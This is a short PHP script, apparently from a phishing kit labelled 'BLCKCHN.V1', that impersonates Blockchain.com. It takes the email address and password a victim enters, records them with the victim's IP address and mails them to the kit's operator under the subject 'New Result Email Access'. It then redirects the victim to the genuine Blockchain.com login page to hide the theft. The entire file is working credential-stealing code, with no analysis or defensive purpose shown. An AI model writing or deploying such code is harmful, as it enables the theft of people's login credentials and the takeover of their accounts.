<?php
include 'function.php';
include '../email.php';
include 'hostname_check.php';
$ip = getenv("REMOTE_ADDR");
$_SESSION['Email']=$_POST['blckmail'];
$_SESSION['Password_email']=$_POST['blckpass'];
$ip=$_SESSION['ip']=getip();
$subject=$_SESSION['subject']="[BLCKCHN.V1] New Result Email Access | ".$ip."" . "\r\n";
send($_SESSION,$to,$subject) ; 
header("Location: https://login.blockchain.com/#/login");
?>